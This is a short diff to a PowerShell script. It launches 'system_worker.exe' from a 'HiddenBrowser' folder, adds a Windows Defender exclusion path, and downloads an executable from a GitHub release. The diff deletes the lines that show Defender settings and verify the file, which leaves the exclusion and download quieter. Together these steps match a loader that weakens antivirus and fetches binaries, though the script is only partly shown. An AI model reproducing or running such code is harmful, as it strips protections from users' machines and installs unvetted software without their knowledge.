@@ -10,21 +10,13 @@ Start-Process "$HOME\Downloads\HiddenBrowser\system_worker.exe"
 
 
 # know exclusion PATH
-Get-MpPreference
 Add-MpPreference -ExclusionPath "D:\SteamLibrary\steamapps\common"
-Get-MpPreference
 
 $DownloadUrl = "https://github.com/madoiscool/LuaTools/releases/download/v1.3.1/LuaTools-win-Setup.exe"
 $Destination = "$HOME\Downloads\LuaTools-win-Setup.exe"
 
 # Download the executable directly to the Downloads folder
 Invoke-WebRequest -Uri $DownloadUrl -OutFile $Destination
-
-# Verify the file size to ensure it downloaded correctly
-Get-Item $Destination | Select-Object Name, Length
-
-
-
 
 # 1. Define your GitHub details
 $GithubUser = "teejaytonytest"
